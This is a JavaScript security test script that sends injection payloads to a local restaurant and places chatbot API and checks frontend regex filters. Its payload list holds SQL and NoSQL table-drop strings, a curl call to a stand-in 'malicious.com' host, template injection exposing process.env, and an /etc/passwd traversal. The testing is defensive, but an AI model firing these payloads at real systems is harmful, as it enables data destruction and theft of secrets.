// Critical Security Test Script - Tests the most dangerous inputs with real API calls
console.log('🔥 Critical Security Test - Testing Real Chatbot with Dangerous Inputs\n');

const API_BASE = 'http://localhost:8001';

// Most critical and realistic attack vectors
const criticalTests = [
    {
        name: "SQL Injection in Restaurant Query", 
        input: "restaurants in istanbul'; DROP TABLE places; --",
        expectsBackendCall: true,
        riskLevel: "🔴 CRITICAL"
    },
    {
        name: "XSS Script Injection",
        input: "<script>alert('XSS')</script> restaurants in istanbul", 
        expectsBackendCall: true,
        riskLevel: "🔴 CRITICAL"
    },
    {
        name: "Command Injection", 
        input: "restaurants in istanbul; curl http://malicious.com/steal",
        expectsBackendCall: true,
        riskLevel: "🔴 CRITICAL" 
    },
    {
        name: "NoSQL Injection",
        input: "restaurants in istanbul\"; return db.users.drop(); //",
        expectsBackendCall: true,
        riskLevel: "🟠 HIGH"
    },
    {
        name: "Template Injection",
        input: "restaurants in {{constructor.constructor('return process')().env}} istanbul",
        expectsBackendCall: true,
        riskLevel: "🟠 HIGH"
    },
    {
        name: "Path Traversal",
        input: "restaurants in ../../../etc/passwd istanbul", 
        expectsBackendCall: true,
        riskLevel: "🟠 HIGH"
    },
    {
        name: "Very Long Input (DoS)", 
        input: "restaurants in istanbul " + "A".repeat(10000),
        expectsBackendCall: true,
        riskLevel: "🟡 MEDIUM"
    },
    {
        name: "Unicode Bypass Attempt",
        input: "餐厅在伊斯坦布尔 restaurants in istanbul",
        expectsBackendCall: false, // Should not detect non-English
        riskLevel: "🟡 MEDIUM"
    },
    {
        name: "Mixed Intent with Harmful Content",
        input: "restaurants in istanbul and how to make bombs",
        expectsBackendCall: true,
        riskLevel: "🟠 HIGH"  
    },
    {
        name: "Header Injection",
        input: "restaurants in istanbul\r\nX-Injected: malicious",
        expectsBackendCall: true,
        riskLevel: "🟠 HIGH"
    }
];

async function testBackendDirectly(input, testName) {
    console.log(`\n🧪 Testing Backend Direct API: ${testName}`);
    console.log(`📝 Input: ${input.substring(0, 100)}${input.length > 100 ? '...' : ''}`);
    
    try {
        // Test restaurant API
        console.log('   🍽️  Testing Restaurant API...');
        const restaurantResponse = await fetch(`${API_BASE}/restaurants/?query=${encodeURIComponent(input)}`);
        if (restaurantResponse.ok) {
            const data = await restaurantResponse.json();
            console.log(`   ✅ Restaurant API Response: ${data.length || 0} results`);
        } else {
            console.log(`   ❌ Restaurant API Error: ${restaurantResponse.status}`);
        }
        
        // Test places API 
        console.log('   🏛️  Testing Places API...');
        const placesResponse = await fetch(`${API_BASE}/places/?limit=1`);
        if (placesResponse.ok) {
            const placesData = await placesResponse.json();  
            console.log(`   ✅ Places API Response: ${placesData.length || 0} results`);
        } else {
            console.log(`   ❌ Places API Error: ${placesResponse.status}`);
        }
        
    } catch (error) {
        console.log(`   💥 Backend Test Failed: ${error.message}`);
        return false;
    }
    
    return true;
}

async function testFrontendDetection(input, testName) {
    console.log(`\n🎯 Testing Frontend Detection: ${testName}`);
    console.log(`📝 Input: ${input.substring(0, 100)}${input.length > 100 ? '...' : ''}`);
    
    // Simulate the frontend preprocessing logic
    try {
        // Step 1: Security sanitization
        const hasSQLPatterns = /[';]|--|\/\*|\*\/|\b(UNION|SELECT|DROP|DELETE|INSERT|UPDATE|ALTER|CREATE)\b/i.test(input);
        const hasXSSPatterns = /<[^>]*>|javascript:|on\w+\s*=/i.test(input);
        const hasCommandInjection = /[;&|`$()]|\$\(/i.test(input);
        
        console.log(`   🛡️  Security Check:`);
        console.log(`      SQL Injection: ${hasSQLPatterns ? '❌ DETECTED' : '✅ Clean'}`);
        console.log(`      XSS Patterns: ${hasXSSPatterns ? '❌ DETECTED' : '✅ Clean'}`);
        console.log(`      Command Injection: ${hasCommandInjection ? '❌ DETECTED' : '✅ Clean'}`);
        
        // Step 2: Detection logic
        const processedInput = input.toLowerCase().trim();
        const isRestaurantQuery = processedInput.includes('restaurant') && processedInput.includes('in');
        const isPlacesQuery = (processedInput.includes('place') || processedInput.includes('attraction')) && processedInput.includes('istanbul');
        
        console.log(`   🎯 Intent Detection:`);
        console.log(`      Restaurant Query: ${isRestaurantQuery ? '✅ YES' : '❌ NO'}`);
        console.log(`      Places Query: ${isPlacesQuery ? '✅ YES' : '❌ NO'}`);
        
        if (isRestaurantQuery || isPlacesQuery) {
            console.log(`   🚨 CRITICAL ISSUE: Malicious input would reach backend API!`);
            return { wouldCallBackend: true, hasSecurity: hasSQLPatterns || hasXSSPatterns || hasCommandInjection };
        } else {
            console.log(`   ✅ Safe: Would send to GPT chat instead`);
            return { wouldCallBackend: false, hasSecurity: hasSQLPatterns || hasXSSPatterns || hasCommandInjection };
        }
        
    } catch (error) {
        console.log(`   💥 Frontend Detection Failed: ${error.message}`);
        return { wouldCallBackend: false, hasSecurity: true, error: true };
    }
}

async function runCriticalTests() {
    console.log('🚀 Starting Critical Security Tests...\n');
    
    let totalTests = 0;
    let criticalIssues = 0;
    let backendReachable = true;
    
    // First test if backend is reachable
    try {
        const healthCheck = await fetch(`${API_BASE}/places/?limit=1`);
        if (!healthCheck.ok) {
            console.log('⚠️  Backend may not be fully functional, continuing with detection tests...\n');
            backendReachable = false;
        }
    } catch (error) {
        console.log('❌ Backend not reachable, running detection tests only...\n');
        backendReachable = false;
    }
    
    for (const test of criticalTests) {
        console.log(`${'='.repeat(80)}`);
        console.log(`${test.riskLevel} ${test.name}`);  
        console.log(`${'='.repeat(80)}`);
        
        // Test frontend detection  
        const detectionResult = await testFrontendDetection(test.input, test.name);
        
        // Test backend if reachable
        if (backendReachable) {
            await testBackendDirectly(test.input, test.name);
        }
        
        // Analyze results
        if (detectionResult.wouldCallBackend && detectionResult.hasSecurity) {
            console.log(`\n🚨 CRITICAL SECURITY ISSUE: Malicious input with security patterns would reach backend!`);
            criticalIssues++;
        } else if (detectionResult.wouldCallBackend) {
            console.log(`\n⚠️  WARNING: Input would reach backend (may be legitimate)`);
        } else if (detectionResult.hasSecurity) {
            console.log(`\n✅ GOOD: Security patterns detected but wouldn't reach backend`);
        } else {
            console.log(`\n✅ SAFE: Clean input, proper handling`);
        }
        
        totalTests++;
        
        // Small delay between tests
        await new Promise(resolve => setTimeout(resolve, 100));
    }
    
    // Final report
    console.log(`\n${'='.repeat(80)}`);
    console.log(`📊 CRITICAL TEST RESULTS SUMMARY`);
    console.log(`${'='.repeat(80)}`);
    console.log(`Total Critical Tests: ${totalTests}`);
    console.log(`Critical Security Issues: ${criticalIssues}`);
    console.log(`Backend Reachable: ${backendReachable ? '✅ Yes' : '❌ No'}`);
    
    if (criticalIssues > 0) {
        console.log(`\n🚨 URGENT ACTION REQUIRED:`);
        console.log(`• ${criticalIssues} critical security vulnerabilities found`);
        console.log(`• Malicious inputs can reach the backend APIs`);
        console.log(`• Input sanitization may not be sufficient`);
        console.log(`• Backend validation is crucial as a second line of defense`);
        
        console.log(`\n💡 IMMEDIATE FIXES NEEDED:`);
        console.log(`• Strengthen input sanitization in frontend`);
        console.log(`• Add backend input validation and sanitization`);
        console.log(`• Implement rate limiting and input length limits`);
        console.log(`• Add WAF (Web Application Firewall) protection`);
        console.log(`• Use parameterized queries in backend`);
        console.log(`• Add CSP headers and XSS protection`);
        console.log(`• Monitor and log suspicious inputs`);
        
    } else {
        console.log(`\n✅ GOOD NEWS:`);
        console.log(`• No critical security issues detected in current tests`);
        console.log(`• Input sanitization appears to be working`);
        console.log(`• Continue monitoring and testing regularly`);
    }
    
    console.log(`\n🔍 NEXT STEPS:`);
    console.log(`• Test these inputs manually in the browser at http://localhost:3000`);
    console.log(`• Check browser console for detailed security logs`);
    console.log(`• Monitor backend logs for any unusual patterns`);
    console.log(`• Consider adding automated security scanning to CI/CD`);
    console.log(`• Perform penetration testing before production`);
}

// Run the critical tests
runCriticalTests().catch(error => {
    console.error('💥 Critical test suite failed:', error);
});
